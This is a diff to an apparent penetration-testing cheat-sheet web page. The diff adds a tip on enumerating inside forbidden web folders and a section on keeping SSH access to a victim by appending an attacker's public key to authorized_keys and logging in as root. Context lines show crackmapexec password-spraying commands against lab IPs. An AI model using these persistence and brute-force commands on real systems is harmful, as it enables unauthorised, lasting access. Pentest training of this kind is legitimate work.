@@ -39,8 +39,8 @@
                     <img src="/H4ckV4ult/images/file_logo.png"> 
                     <h3>SubdomainLister.sh</h3>
                 </a>
+                <h3>Remember that eventhough a web folder returns forbidden you can enumerate inside of it and you may found something interesting. Try out with different dictionaries</h3>
             </ul>
-           
 
             <div class="notion-header">
                 <h1 id="OWASP TOP 10">OWASP TOP 10</h1>   
@@ -317,7 +317,35 @@ int main() {
                     <pre><code class="language-bash">crackmapexec smb 10.10.10.184 -u USERNAME -p passwords.txt
 crackmapexec ftp 10.10.10.184 -u USERNAME -p passwords.txt
 crackmapexec ssh 10.10.10.184 -u USERNAME -p passwords.txt</code></pre>
+                </ul>
+            </div>
+
+
+            <div class="notion-header"> 
+                <h1 id="Persistance">Persitance</h1>
+            </div>
+
+            <div class="notion-body">
+                <ul>
+                    <p>This is a simple method to persist in a system using SSH. You can apply this process for any user inside the system</p>
+                    <p>On your attacker machine generate a public key</p>
+                    <pre><code class="language-bash">ssh-keygen
+
+Generating public/private ed25519 key pair.
+Enter file in which to save the key (/root/.ssh/id_ed25519): persist
+Enter passphrase for "persist" (empty for no passphrase): 
+Enter same passphrase again:</code></pre>
+                    <p>Change public key file permissions to private key</p>
                     
+
+                    <p>Transfer the public key file to the victim (persist.pub) and add it's content to authorized_keys file </p>
+                    <pre><code class="language-bash">cat persist.pub 
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPqRDQ0mTYDYnx0cJOUWyNGGrhhjYddfIIoO9HkopkTg root@kali
+
+echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPqRDQ0mTYDYnx0cJOUWyNGGrhhjYddfIIoO9HkopkTg root@kali" >> authorized_keys</code></pre>        
+                   <p>Connect to the victims using private key</p> 
+                   <pre><code class="language-bash">ssh -i persist root@10.10.10.187</code></pre> 
+                  
                 </ul>
             </div>
             
